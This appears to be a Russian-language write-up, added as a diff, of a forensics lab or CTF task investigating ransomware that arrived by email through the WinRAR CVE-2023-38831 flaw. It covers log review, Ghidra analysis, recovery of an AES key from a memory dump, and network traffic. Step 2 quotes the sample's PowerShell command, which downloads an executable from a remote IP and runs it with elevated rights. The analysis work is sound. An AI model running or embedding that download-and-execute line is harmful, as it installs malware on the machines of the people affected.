@@ -1,0 +1,13 @@
+1) ВПО попало на компьютер через почту, об этом сказано в легенде, это также можно понять из расположения архива с ВПО (Z:\Evgeniy\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\CQ2HQVTU\)
+
+2) В журнале событий powershell можно найти команду, скачивающую файл http://95.169.192.220:8080 (либо можно открыть файл, содержащий уязвимость, в нем есть команда $drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop")
+
+3) google winrar cve -> https://habr.com/ru/articles/797127/ (CVE-2023-38831, описание совпадает с содержимым архива)
+
+4) Используем ghidra, дизассемблируем функции и видим вызовы к IsProcessorFeaturePresent, IsDebuggerPresent и CheckRemoteDebuggerPresent
+
+6) Используем strings на дамп памяти и ищем все строки с длиной в 32 байта. Одна из таких строк - amogusamogusamogusamogusamogusam, которая и является ключом (можно проверить расшифровкой файла)
+
+5) Расшифровываем pass.txt.ransom в режиме CBC без iv и видим, что второй блок расшифровался успешно, в отличие от первого; в режиме CBC plaintext xorится с ciphertext предыдущего блока, что объясняет, почему второй блок был успешно расшифрован; также мы видим padding во втором блоке, следовательно, применяемый режим AES - не потоковый, а блочный, то есть, используется действительно CBC
+
+7) Запускаем wireshark на хосте (не в виртуальной машине) и видим dns-запросы с api.telegram.com
